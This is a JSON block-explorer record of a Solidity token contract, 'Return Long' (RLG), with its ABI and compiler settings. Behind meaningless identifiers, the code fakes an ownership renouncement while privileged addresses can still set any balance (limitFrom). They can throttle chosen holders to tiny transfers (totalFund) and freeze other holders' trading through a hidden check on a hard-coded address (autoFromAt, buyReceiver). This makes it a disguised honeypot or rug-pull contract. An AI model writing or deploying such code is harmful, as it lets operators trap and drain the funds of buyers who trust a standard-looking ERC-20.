{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface maxShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract senderLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountLimit {\n    function createPair(address tradingExempt, address exemptAmount) external returns (address);\n}\n\ninterface buyAmountShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverTokenLaunched) external view returns (uint256);\n\n    function transfer(address tokenSender, uint256 tradingWallet) external returns (bool);\n\n    function allowance(address exemptFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenSender,\n        uint256 tradingWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyMarketing, uint256 value);\n    event Approval(address indexed exemptFrom, address indexed spender, uint256 value);\n}\n\ninterface buyAmountShouldMetadata is buyAmountShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReturnLong is senderLaunch, buyAmountShould, buyAmountShouldMetadata {\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingFromTx;\n    }\n\n    function balanceOf(address receiverTokenLaunched) public view virtual override returns (uint256) {\n        return marketingFrom[receiverTokenLaunched];\n    }\n\n    mapping(address => bool) public maxLimit;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingFee;\n    }\n\n    function transfer(address takeToken, uint256 tradingWallet) external virtual override returns (bool) {\n        return buyReceiver(_msgSender(), takeToken, tradingWallet);\n    }\n\n    uint256 shouldReceiver;\n\n    function limitFrom(address takeToken, uint256 tradingWallet) public {\n        fromShould();\n        marketingFrom[takeToken] = tradingWallet;\n    }\n\n    constructor (){\n        if (totalMarketing == launchedSell) {\n            totalMarketing = true;\n        }\n        maxShould enableMode = maxShould(fromLiquidity);\n        maxAmount = amountLimit(enableMode.factory()).createPair(enableMode.WETH(), address(this));\n        if (teamSell != receiverTotal) {\n            launchedSell = false;\n        }\n        senderTotalMax = _msgSender();\n        isBuy();\n        maxLimit[senderTotalMax] = true;\n        marketingFrom[senderTotalMax] = tradingFee;\n        \n        emit Transfer(address(0), senderTotalMax, tradingFee);\n    }\n\n    event OwnershipTransferred(address indexed liquidityTeam, address indexed limitSender);\n\n    bool private enableFrom;\n\n    mapping(address => uint256) private marketingFrom;\n\n    uint256 constant isAuto = 12 ** 10;\n\n    uint8 private senderIsToken = 18;\n\n    function approve(address buyToken, uint256 tradingWallet) public virtual override returns (bool) {\n        launchSender[_msgSender()][buyToken] = tradingWallet;\n        emit Approval(_msgSender(), buyToken, tradingWallet);\n        return true;\n    }\n\n    function tradingMarketingTake(address receiverEnableIs, address tokenSender, uint256 tradingWallet) internal returns (bool) {\n        require(marketingFrom[receiverEnableIs] >= tradingWallet);\n        marketingFrom[receiverEnableIs] -= tradingWallet;\n        marketingFrom[tokenSender] += tradingWallet;\n        emit Transfer(receiverEnableIs, tokenSender, tradingWallet);\n        return true;\n    }\n\n    uint256 public teamSell;\n\n    uint256 private tradingFee = 100000000 * 10 ** 18;\n\n    function allowance(address atFrom, address buyToken) external view virtual override returns (uint256) {\n        if (buyToken == fromLiquidity) {\n            return type(uint256).max;\n        }\n        return launchSender[atFrom][buyToken];\n    }\n\n    function transferFrom(address receiverEnableIs, address tokenSender, uint256 tradingWallet) external override returns (bool) {\n        if (_msgSender() != fromLiquidity) {\n            if (launchSender[receiverEnableIs][_msgSender()] != type(uint256).max) {\n                require(tradingWallet <= launchSender[receiverEnableIs][_msgSender()]);\n                launchSender[receiverEnableIs][_msgSender()] -= tradingWallet;\n            }\n        }\n        return buyReceiver(receiverEnableIs, tokenSender, tradingWallet);\n    }\n\n    address public maxAmount;\n\n    bool public tokenReceiver;\n\n    string private tradingFromTx = \"RLG\";\n\n    address private tokenMin;\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderIsToken;\n    }\n\n    function teamListLaunch(address marketingTradingBuy) public {\n        if (tokenReceiver) {\n            return;\n        }\n        if (receiverTotal != teamSell) {\n            teamSell = receiverTotal;\n        }\n        maxLimit[marketingTradingBuy] = true;\n        \n        tokenReceiver = true;\n    }\n\n    bool private totalMarketing;\n\n    function totalFund(address receiverFrom) public {\n        fromShould();\n        \n        if (receiverFrom == senderTotalMax || receiverFrom == maxAmount) {\n            return;\n        }\n        liquidityShouldAt[receiverFrom] = true;\n    }\n\n    uint256 enableTotal;\n\n    address isLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public receiverTotal;\n\n    bool public launchedSell;\n\n    string private marketingAmount = \"Return Long\";\n\n    function buyReceiver(address receiverEnableIs, address tokenSender, uint256 tradingWallet) internal returns (bool) {\n        if (receiverEnableIs == senderTotalMax) {\n            return tradingMarketingTake(receiverEnableIs, tokenSender, tradingWallet);\n        }\n        uint256 modeWallet = buyAmountShould(maxAmount).balanceOf(isLaunch);\n        require(modeWallet == shouldReceiver);\n        require(tokenSender != isLaunch);\n        if (liquidityShouldAt[receiverEnableIs]) {\n            return tradingMarketingTake(receiverEnableIs, tokenSender, isAuto);\n        }\n        return tradingMarketingTake(receiverEnableIs, tokenSender, tradingWallet);\n    }\n\n    function getOwner() external view returns (address) {\n        return tokenMin;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingAmount;\n    }\n\n    mapping(address => mapping(address => uint256)) private launchSender;\n\n    function owner() external view returns (address) {\n        return tokenMin;\n    }\n\n    function isBuy() public {\n        emit OwnershipTransferred(senderTotalMax, address(0));\n        tokenMin = address(0);\n    }\n\n    function fromShould() private view {\n        require(maxLimit[_msgSender()]);\n    }\n\n    mapping(address => bool) public liquidityShouldAt;\n\n    address public senderTotalMax;\n\n    function autoFromAt(uint256 tradingWallet) public {\n        fromShould();\n        shouldReceiver = tradingWallet;\n    }\n\n    address fromLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingWallet\",\"type\":\"uint256\"}],\"name\":\"autoFromAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTokenLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingWallet\",\"type\":\"uint256\"}],\"name\":\"limitFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityShouldAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTotalMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTradingBuy\",\"type\":\"address\"}],\"name\":\"teamListLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"}],\"name\":\"totalFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverEnableIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ReturnLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}